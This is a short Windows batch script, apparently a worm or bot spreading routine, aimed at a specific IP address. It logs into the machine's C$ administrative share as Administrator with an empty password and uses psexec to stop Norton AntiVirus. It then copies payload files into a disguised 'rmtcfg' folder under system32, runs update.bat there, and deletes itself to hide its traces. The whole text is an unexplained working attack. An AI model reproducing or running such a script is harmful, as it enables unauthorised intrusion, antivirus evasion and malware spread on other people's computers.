net use t: /delete
net use \\217.211.125.31 /USER:Administratör
net use t: \\217.211.125.31\C$
psexec \\217.211.125.31 -u Administratör -p "" net stop "Norton AntiVirus Server"
psexec \\217.211.125.31 -u Administratör -p "" -c temp.bat
mkdir t:\winnt\system32\rmtcfg
mkdir t:\winnt\system32\catroot
copy copy\* t:\winnt\system32\rmtcfg
mkdir t:\winnt\system32\rmtcfg\files
mkdir t:\winnt\system32\rmtcfg\files\copy
mkdir t:\winnt\system32\rmtcfg\files\dat
mkdir t:\winnt\system32\rmtcfg\files\log
mkdir t:\winnt\system32\rmtcfg\files\plugin
copy C:\WINNT\SYSTEM32\RMTCFG\files\* t:\winnt\system32\rmtcfg\files
copy copy\* t:\winnt\system32\rmtcfg\files\copy
copy plugin\* t:\winnt\system32\rmtcfg\files\plugin
copy dat\* t:\winnt\system32\rmtcfg\files\dat
psexec \\217.211.125.31 -u Administratör -p "" -d c:\winnt\system32\rmtcfg\update.bat
net use t: /delete
net use \\217.211.125.31 /delete
del runme477837.bat
